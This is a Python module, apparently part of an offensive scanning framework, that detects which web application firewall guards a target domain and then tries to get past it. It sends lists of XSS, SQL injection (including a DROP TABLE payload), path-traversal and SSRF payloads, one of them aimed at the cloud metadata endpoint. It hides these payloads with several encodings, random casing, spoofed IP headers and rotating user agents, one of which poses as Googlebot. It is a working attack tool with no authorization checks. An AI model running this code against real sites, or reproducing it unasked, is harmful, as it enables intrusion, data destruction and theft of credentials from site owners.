#!/usr/bin/env python3
"""WAF detection and bypass techniques"""

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random
import base64
import urllib.parse
from core.logger import get_logger

log = get_logger("WAFBypass")

WAF_SIGNATURES = {
    "Cloudflare":   ["cloudflare", "cf-ray", "__cfduid", "403 Forbidden | Cloudflare"],
    "Imperva":      ["visid_incap", "incap_ses", "x-iinfo"],
    "Akamai":       ["akamai", "ak_bmsc", "bm_sz"],
    "F5 BIG-IP":    ["BigIP", "TS"],
    "ModSecurity":  ["mod_security", "NOYB"],
    "AWS WAF":      ["aws", "X-AMZ-CF-ID"],
    "Sucuri":       ["x-sucuri-id", "sucuri"],
}

BYPASS_PAYLOADS = {
    "xss": [
        "<script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x onerror=alert(1)>",
        "\x3cscript\x3ealert(1)\x3c/script\x3e",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "<svg onload=alert(1)>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<details open ontoggle=alert(1)>",
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "1 UNION SELECT NULL--",
        "1; DROP TABLE users--",
        "\x27 OR \x271\x27=\x271",
        "1/**/OR/**/1=1",
        "1%27%20OR%20%271%27%3D%271",
    ],
    "lfi": [
        "../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e/%2e%2e/etc/passwd",
        "..%252f..%252fetc%252fpasswd",
        "/etc/passwd%00",
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "dict://127.0.0.1:22/",
    ],
}


class WAFBypassModule:
    def __init__(self, cfg):
        self.cfg     = cfg
        self._session = requests.Session()

    def run(self, domain: str) -> dict:
        log.info(f"[WAFBypass] Analyzing: {domain}")
        url     = f"https://{domain}"
        results = {
            "waf_detected":  self._detect_waf(url),
            "bypass_results": {},
            "headers_bypass": self._test_header_bypass(url),
            "encoding_bypass": self._test_encoding(url),
        }

        for category, payloads in BYPASS_PAYLOADS.items():
            results["bypass_results"][category] = self._test_payloads(url, category, payloads)

        return results

    def _detect_waf(self, url: str) -> dict:
        detected = {}
        try:
            r = self._session.get(url, timeout=10, verify=False)
            headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
            body_lower    = r.text.lower()

            for waf_name, sigs in WAF_SIGNATURES.items():
                for sig in sigs:
                    sig_l = sig.lower()
                    if sig_l in body_lower or any(sig_l in v for v in headers_lower.values()):
                        detected[waf_name] = True
                        break
        except Exception as e:
            log.debug(f"  [WAF] detect error: {e}")

        log.info(f"  [WAF] Detected: {list(detected.keys()) or 'None'}")
        return detected

    def _test_payloads(self, url: str, category: str, payloads: list) -> list:
        results = []
        for payload in payloads:
            for method in (self._plain, self._url_encoded, self._double_encoded, self._case_random):
                encoded = method(payload)
                try:
                    r = self._session.get(
                        url, params={"q": encoded},
                        headers=self._random_headers(),
                        timeout=8, verify=False
                    )
                    blocked = r.status_code in (403, 406, 429, 503) or "blocked" in r.text.lower()
                    results.append({
                        "payload":  payload,
                        "method":   method.__name__,
                        "status":   r.status_code,
                        "blocked":  blocked,
                        "bypassed": not blocked and r.status_code < 400,
                    })
                except Exception:
                    pass
        return results

    def _test_header_bypass(self, url: str) -> dict:
        bypass_headers = {
            "X-Forwarded-For":     "127.0.0.1",
            "X-Real-IP":           "127.0.0.1",
            "X-Originating-IP":    "127.0.0.1",
            "X-Remote-IP":         "127.0.0.1",
            "X-Remote-Addr":       "127.0.0.1",
            "X-Host":              "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
        }
        results = {}
        for header, value in bypass_headers.items():
            try:
                r = self._session.get(url, headers={header: value},
                                      timeout=8, verify=False)
                results[header] = {"status": r.status_code}
            except Exception:
                pass
        return results

    def _test_encoding(self, url: str) -> dict:
        return {
            "double_url":   self._double_encoded("test"),
            "base64":       base64.b64encode(b"test").decode(),
            "unicode":      "\u0074\u0065\u0073\u0074",
            "html_entity":  "&#116;&#101;&#115;&#116;",
        }

    def _plain(self, s): return s
    def _url_encoded(self, s): return urllib.parse.quote(s)
    def _double_encoded(self, s): return urllib.parse.quote(urllib.parse.quote(s))
    def _case_random(self, s):
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    def _random_headers(self) -> dict:
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
        ]
        return {
            "User-Agent": random.choice(agents),
            "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        }
